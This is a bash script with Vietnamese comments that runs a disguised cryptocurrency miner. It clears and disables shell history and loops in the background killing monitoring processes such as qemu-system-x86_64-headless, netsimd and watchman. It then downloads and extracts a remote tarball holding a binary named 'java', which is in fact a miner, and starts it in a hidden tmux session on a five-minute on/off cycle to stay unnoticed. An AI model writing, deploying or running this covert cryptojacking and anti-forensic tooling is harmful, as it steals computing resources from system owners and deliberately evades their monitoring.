#!/bin/bash

SESSION="java"
DOMAIN="$1"
NAME_WORK="$2"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# 🔁 Kill các tiến trình giám sát
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &

# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/java/java" ]; then
    echo "[+] Downloading ..."
    rm -rf java java.tar.gz
    wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
    tar -xzf java.tar.gz
    chmod +x java/java
    rm -f java.tar.gz
fi

# 🔁 Vòng lặp chạy miner
echo "[+] Vòng lặp ..."
while true; do
    # 1. Chạy process
    tmux kill-session -t $SESSION 2>/dev/null
    sleep 2
    tmux new-session -s $SESSION -d
    tmux send-keys -t $SESSION "
        $(pwd)/java/java -o $DOMAIN --tls -k -t 2 --rig-id $NAME_WORK
    " C-m
    echo "[+] start process start process start process start process start process start process - chạy 5 phút..."
    sleep 300   # chạy 5 phút

    # 2. Kill process
    pkill -f "$(pwd)/java/java" 2>/dev/null
    echo "[+] kill process kill process kill process kill process kill process - nghỉ 5 phút..."
    sleep 298   # nghỉ 5 phút trước khi chạy lại
done
